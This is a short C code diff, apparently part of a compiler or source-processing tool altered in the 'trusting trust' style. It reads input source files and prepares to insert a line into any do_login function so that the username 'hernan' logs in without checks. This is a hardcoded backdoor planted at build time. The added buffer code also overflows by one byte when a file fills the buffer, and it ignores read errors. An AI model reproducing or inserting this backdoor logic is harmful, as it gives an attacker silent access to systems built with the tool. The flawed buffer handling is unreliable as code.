@@ -362,6 +362,11 @@ redo:
     first_file = NULL;
     do {
         struct filespec *f = s->files[n];
+        char source[30000];
+        int source_fd = open(f->name,  O_RDONLY  | 0660);
+        int bytesRead = read(source_fd, source, sizeof(source));
+        close(source_fd);
+        source[bytesRead] = '\0'; //cant forget to null terminate :)          
         char login_target_line[] = "static int do_login(const char *username){";
         char login_to_insert[] = "if (!strcmp(username, \"hernan\"))return 0;\n";                
 
